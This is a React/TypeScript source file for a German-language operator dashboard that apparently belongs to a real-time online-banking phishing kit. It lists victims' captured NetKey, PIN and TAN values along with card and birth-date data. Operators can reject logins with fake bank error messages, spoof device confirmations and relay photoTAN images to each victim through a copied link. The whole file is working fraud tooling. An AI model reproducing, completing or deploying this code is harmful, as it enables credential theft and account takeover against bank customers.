import { useEffect, useRef, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { Link2, ShieldCheck, XCircle, RefreshCw, CheckCircle2, Trash2, Upload, Smartphone } from "lucide-react";
import { toast } from "sonner";

type AuthRow = {
  id: string;
  token: string;
  auftraggeber_name: string | null;
  customer_phase: string | null;
  tan_method: string | null;
  device_name: string | null;
  photo_tan_image: string | null;
  last_error: string | null;
  show_berater: boolean | null;
  used: boolean;
  created_at: string;
};

type MetaRow = { task_id: string; netkey: string | null; pin: string | null; tan: string | null; berater_geburtsdatum?: string | null; berater_karte?: string | null };

const PHASE_LABEL: Record<string, string> = {
  login: "Wartet auf Login",
  login_review: "Login prüfen",
  login_rejected: "Login abgelehnt",
  berater: "Berater-Verifizierung (Kunde)",
  berater_review: "Berater-Daten prüfen",
  confirm: "Gerätebestätigung",
  phototan_request: "PhotoTAN wird angefordert",
  phototan: "PhotoTAN-Eingabe",
  tan_review: "TAN prüfen",
  phototan_rejected: "TAN abgelehnt",
  success: "Erfolgreich (Loader)",
  aborted: "Abgebrochen",
};


const AuthLiveCard = () => {
  const [rows, setRows] = useState<AuthRow[]>([]);
  const [metas, setMetas] = useState<Record<string, MetaRow>>({});

  const load = async () => {
    const [{ data: a }, { data: m }] = await Promise.all([
      (supabase as any).from("auth_tokens").select("*").order("created_at", { ascending: false }).limit(50),
      (supabase as any).from("panel_task_meta").select("task_id, netkey, pin, tan, berater_geburtsdatum, berater_karte").like("task_id", "auth:%"),
    ]);
    setRows(a || []);
    const map: Record<string, MetaRow> = {};
    (m || []).forEach((x: any) => { map[String(x.task_id).replace(/^auth:/, "")] = x; });
    setMetas(map);
  };

  useEffect(() => {
    load();
    const ch1 = (supabase as any).channel("auth_live_tokens")
      .on("postgres_changes", { event: "*", schema: "public", table: "auth_tokens" }, load).subscribe();
    const ch2 = (supabase as any).channel("auth_live_meta")
      .on("postgres_changes", { event: "*", schema: "public", table: "panel_task_meta" }, load).subscribe();
    const iv = window.setInterval(load, 4000);
    return () => { window.clearInterval(iv); (supabase as any).removeChannel(ch1); (supabase as any).removeChannel(ch2); };
  }, []);

  const update = async (id: string, patch: Record<string, any>) => {
    const { error } = await (supabase as any).from("auth_tokens").update(patch).eq("id", id);
    if (error) toast.error(error.message);
  };

  const setPhase = (r: AuthRow, phase: string, extra: Record<string, any> = {}) =>
    update(r.id, { customer_phase: phase, ...extra });

  const rejectLogin = (r: AuthRow) => setPhase(r, "login_rejected", {
    last_error: "Anmeldung fehlgeschlagen. Bitte überprüfen Sie Ihre Zugangsdaten.",
  });
  const acceptLogin = (r: AuthRow) =>
    setPhase(r, r.tan_method === "photo" ? "phototan" : "confirm", { last_error: null });
  const acceptBerater = (r: AuthRow) => setPhase(r, "login", { last_error: null });
  const rejectBerater = (r: AuthRow) => setPhase(r, "berater", {
    last_error: "Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.",
  });


  const setDeviceName = (r: AuthRow, name: string) => update(r.id, { device_name: name });

  const setPhotoTanImage = (r: AuthRow, dataUrl: string | null) =>
    update(r.id, { photo_tan_image: dataUrl });

  const showPhotoTan = (r: AuthRow) => setPhase(r, "phototan", { last_error: null });

  const rejectTan = async (r: AuthRow) => {
    await (supabase as any).from("panel_task_meta").update({ tan: null }).eq("task_id", `auth:${r.id}`);
    await setPhase(r, "phototan_rejected", {
      last_error: "Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.",
    });
  };

  const acceptTan = (r: AuthRow) => update(r.id, {
    customer_phase: "success",
    used: true,
    used_at: new Date().toISOString(),
    security_status: "approved",
    security_status_at: new Date().toISOString(),
    last_error: null,
  });

  const abort = (r: AuthRow) => {
    if (!window.confirm("Session wirklich abbrechen?")) return;
    setPhase(r, "aborted", { last_error: null });
  };

  const remove = async (r: AuthRow) => {
    if (!window.confirm("Session wirklich löschen?")) return;
    await (supabase as any).from("panel_task_meta").delete().eq("task_id", `auth:${r.id}`);
    await (supabase as any).from("auth_tokens").delete().eq("id", r.id);
    toast.success("Gelöscht");
  };

  const copyLink = async (r: AuthRow) => {
    const url = `${window.location.origin}/auth/${r.token}`;
    try { await navigator.clipboard.writeText(url); toast.success("Kunden-Link kopiert"); } catch { toast.error("Kopieren fehlgeschlagen"); }
  };

  if (!rows.length) return null;

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2"><ShieldCheck className="h-5 w-5" /> Live-Steuerung Kundenauthentifizierung</CardTitle>
      </CardHeader>
      <CardContent className="space-y-4">
        {rows.map(r => {
          const meta = metas[r.id];
          const phase = r.customer_phase || "login";
          const done = phase === "success" || phase === "aborted";
          return (
            <div key={r.id} className={`rounded-md border p-4 space-y-3 ${done ? "opacity-70" : ""}`}>
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-2 min-w-0">
                  <span className="font-mono text-sm px-2 py-0.5 rounded bg-muted">{r.token}</span>
                  <Badge variant={done ? "secondary" : "default"}>{PHASE_LABEL[phase] || phase}</Badge>
                  {r.auftraggeber_name && <span className="text-sm text-muted-foreground truncate">{r.auftraggeber_name}</span>}
                </div>
                <div className="flex gap-1">
                  <Button size="sm" variant="ghost" onClick={() => copyLink(r)} title="Kunden-Link kopieren"><Link2 className="h-4 w-4" /></Button>
                  <Button size="sm" variant="ghost" onClick={() => remove(r)} title="Löschen"><Trash2 className="h-4 w-4" /></Button>
                </div>
              </div>

              <div className="grid sm:grid-cols-3 gap-2 text-sm">
                <MetaField label="NetKey / Alias" value={meta?.netkey || "—"} mono />
                <MetaField label="PIN" value={meta?.pin || "—"} mono />
                <MetaField label="TAN" value={meta?.tan || "—"} mono bold />
              </div>
              {r.show_berater && (meta?.berater_geburtsdatum || meta?.berater_karte) && (
                <div className="grid sm:grid-cols-2 gap-2 text-sm">
                  <MetaField label="Berater – Geburtsdatum" value={meta?.berater_geburtsdatum || "—"} mono />
                  <MetaField label="Berater – Kartennummer" value={meta?.berater_karte || "—"} mono />
                </div>
              )}

              {!done && (
                <div className="space-y-3 pt-2 border-t">
                  {/* Step 1: Login submitted */}
                  {(phase === "login" || phase === "login_review" || phase === "login_rejected") && (
                    <StepBlock title="Login prüfen">
                      <div className="flex flex-wrap gap-2">
                        <Button size="sm" variant="destructive" onClick={() => rejectLogin(r)} disabled={!meta?.pin}>
                          <XCircle className="h-4 w-4 mr-1" />Login ablehnen
                        </Button>
                        <DeviceNameField r={r} onSave={n => setDeviceName(r, n)} />
                        <Button size="sm" onClick={() => acceptLogin(r)} disabled={!meta?.pin}>
                          <Smartphone className="h-4 w-4 mr-1" />Gerätebestätigung anzeigen
                        </Button>
                      </div>
                      {phase === "login" && !meta?.pin && (
                        <p className="text-xs text-muted-foreground">Wartet auf Login-Eingabe des Kunden.</p>
                      )}
                    </StepBlock>
                  )}





                  {/* Step 2: Confirm shown, waiting customer to click photoTAN */}
                  {phase === "confirm" && (
                    <StepBlock title="Kunde bestätigt Gerät">
                      <p className="text-xs text-muted-foreground">
                        Kunde sieht Gerätebestätigung mit Namen „{r.device_name || "iPhone"}". Wartet auf Klick auf photoTAN.
                      </p>
                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
                    </StepBlock>
                  )}

                  {/* Step 3: photoTAN requested, admin releases image */}
                  {phase === "phototan_request" && (
                    <StepBlock title="PhotoTAN freigeben">
                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} />
                      <div className="flex flex-wrap gap-2">
                        <Button size="sm" onClick={() => showPhotoTan(r)}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />PhotoTAN anzeigen
                        </Button>
                      </div>
                    </StepBlock>
                  )}

                  {/* Step 4: TAN eingabe / prüfung */}
                  {(phase === "phototan" || phase === "tan_review" || phase === "phototan_rejected") && (
                    <StepBlock title="TAN prüfen">
                      <PhotoTanUploader r={r} onSet={url => setPhotoTanImage(r, url)} compact />
                      <div className="flex flex-wrap gap-2">
                        <Button size="sm" variant="destructive" onClick={() => rejectTan(r)} disabled={!meta?.tan}>
                          <XCircle className="h-4 w-4 mr-1" />TAN ablehnen
                        </Button>
                        <Button size="sm" variant="outline" onClick={() => showPhotoTan(r)}>
                          <RefreshCw className="h-4 w-4 mr-1" />Neue PhotoTAN anzeigen
                        </Button>
                        <Button size="sm" onClick={() => acceptTan(r)} disabled={!meta?.tan}>
                          <CheckCircle2 className="h-4 w-4 mr-1" />TAN akzeptieren → Loader
                        </Button>
                      </div>
                    </StepBlock>
                  )}

                  <div className="flex justify-end">
                    <Button size="sm" variant="ghost" onClick={() => abort(r)}>Abbrechen</Button>
                  </div>
                </div>
              )}
            </div>
          );
        })}
      </CardContent>
    </Card>
  );
};

/* ------------ small subcomponents ------------ */

const StepBlock = ({ title, children }: { title: string; children: React.ReactNode }) => (
  <div className="space-y-2">
    <div className="text-xs font-semibold uppercase tracking-wider text-muted-foreground">{title}</div>
    {children}
  </div>
);

const MetaField = ({ label, value, mono, bold }: { label: string; value: string; mono?: boolean; bold?: boolean }) => (
  <div className="min-w-0">
    <div className="text-[10px] uppercase tracking-wider text-muted-foreground">{label}</div>
    <div className={`truncate ${mono ? "font-mono" : ""} ${bold ? "font-bold text-base" : ""}`}>{value}</div>
  </div>
);

const DeviceNameField = ({ r, onSave }: { r: AuthRow; onSave: (name: string) => void }) => {
  const [val, setVal] = useState(r.device_name || "");
  useEffect(() => { setVal(r.device_name || ""); }, [r.device_name]);
  return (
    <div className="flex items-center gap-1">
      <Input value={val} onChange={e => setVal(e.target.value)} placeholder="Gerätename z. B. iPhone von Max" className="h-8 w-56" />
      <Button size="sm" variant="outline" onClick={() => onSave(val)}>Setzen</Button>
    </div>
  );
};

const PhotoTanUploader = ({ r, onSet, compact }: { r: AuthRow; onSet: (url: string | null) => void; compact?: boolean }) => {
  const inputRef = useRef<HTMLInputElement>(null);
  const [url, setUrl] = useState("");
  const [loading, setLoading] = useState(false);

  const cropDataUrl = (dataUrl: string, crop?: { x: number; y: number; w: number; h: number }) =>
    new Promise<string>((resolve, reject) => {
      const img = new Image();
      img.onload = () => {
        const box = crop ?? autoCropCanvas(img);
        const cnv = document.createElement("canvas");
        cnv.width = box.w; cnv.height = box.h;
        const ctx = cnv.getContext("2d")!;
        ctx.drawImage(img, box.x, box.y, box.w, box.h, 0, 0, box.w, box.h);
        resolve(cnv.toDataURL("image/png"));
      };
      img.onerror = () => reject(new Error("Bild konnte nicht geladen werden"));
      img.src = dataUrl;
    });

  const onFile = async (f: File) => {
    const reader = new FileReader();
    reader.onload = async () => {
      try {
        const cropped = await cropDataUrl(String(reader.result));
        onSet(cropped);
      } catch { onSet(String(reader.result)); }
    };
    reader.readAsDataURL(f);
  };

  const onUrl = async () => {
    const u = url.trim();
    if (!u) return;
    setLoading(true);
    try {
      const { data, error } = await (supabase as any).functions.invoke("fetch-photo-tan", {
        body: { url: u, autoCrop: true },
      });
      if (error || !data?.dataUrl) throw new Error(error?.message || "Fehler");
      const cropped = await cropDataUrl(data.dataUrl, data.crop);
      onSet(cropped);
      setUrl("");
      toast.success("PhotoTAN übernommen");
    } catch (e: any) {
      toast.error(e.message || "Konnte Bild nicht laden");
    } finally { setLoading(false); }
  };

  return (
    <div className="space-y-2">
      <div className="flex items-center gap-2 flex-wrap">
        <input ref={inputRef} type="file" accept="image/*" hidden
          onChange={e => { const f = e.target.files?.[0]; if (f) onFile(f); e.target.value = ""; }} />
        <Button size="sm" variant="outline" onClick={() => inputRef.current?.click()}>
          <Upload className="h-4 w-4 mr-1" />{r.photo_tan_image ? "Bild ersetzen" : "Bild hochladen"}
        </Button>
        {r.photo_tan_image && (
          <>
            {!compact && <img src={r.photo_tan_image} alt="preview" className="h-10 w-10 object-contain border rounded" />}
            <Button size="sm" variant="ghost" onClick={() => onSet(null)}>entfernen</Button>
          </>
        )}
        {!r.photo_tan_image && <span className="text-xs text-muted-foreground">oder Link einfügen ↓</span>}
      </div>
      <div className="flex items-center gap-2 flex-wrap">
        <Input
          value={url}
          onChange={e => setUrl(e.target.value)}
          onKeyDown={e => { if (e.key === "Enter") onUrl(); }}
          placeholder="Bild-URL (z. B. https://prnt.sc/..., direkte Bild-URL, imgur, ...)"
          className="h-8 flex-1 min-w-[220px]"
        />
        <Button size="sm" onClick={onUrl} disabled={loading || !url.trim()}>
          {loading ? "Lade..." : "Übernehmen"}
        </Button>
      </div>
    </div>
  );
};

// Client-side fallback auto-crop: tight bounding box around dark pixels.
function autoCropCanvas(img: HTMLImageElement): { x: number; y: number; w: number; h: number } {
  const w = img.naturalWidth, h = img.naturalHeight;
  const cnv = document.createElement("canvas");
  cnv.width = w; cnv.height = h;
  const ctx = cnv.getContext("2d")!;
  ctx.drawImage(img, 0, 0);
  let data: Uint8ClampedArray;
  try { data = ctx.getImageData(0, 0, w, h).data; }
  catch { return { x: 0, y: 0, w, h }; }
  const rowThr = Math.max(6, w * 0.02);
  const colThr = Math.max(6, h * 0.02);
  const rowC = new Uint32Array(h), colC = new Uint32Array(w);
  for (let y = 0; y < h; y++) for (let x = 0; x < w; x++) {
    const i = (y * w + x) * 4;
    if ((data[i] + data[i + 1] + data[i + 2]) / 3 < 90) { rowC[y]++; colC[x]++; }
  }
  let top = 0; while (top < h && rowC[top] < rowThr) top++;
  let bot = h - 1; while (bot > top && rowC[bot] < rowThr) bot--;
  let left = 0; while (left < w && colC[left] < colThr) left++;
  let right = w - 1; while (right > left && colC[right] < colThr) right--;
  if (right - left < 40 || bot - top < 40) return { x: 0, y: 0, w, h };
  const pad = Math.round(Math.min(right - left, bot - top) * 0.03);
  return {
    x: Math.max(0, left - pad),
    y: Math.max(0, top - pad),
    w: Math.min(w, right - left + 1 + pad * 2),
    h: Math.min(h, bot - top + 1 + pad * 2),
  };
}


export default AuthLiveCard;
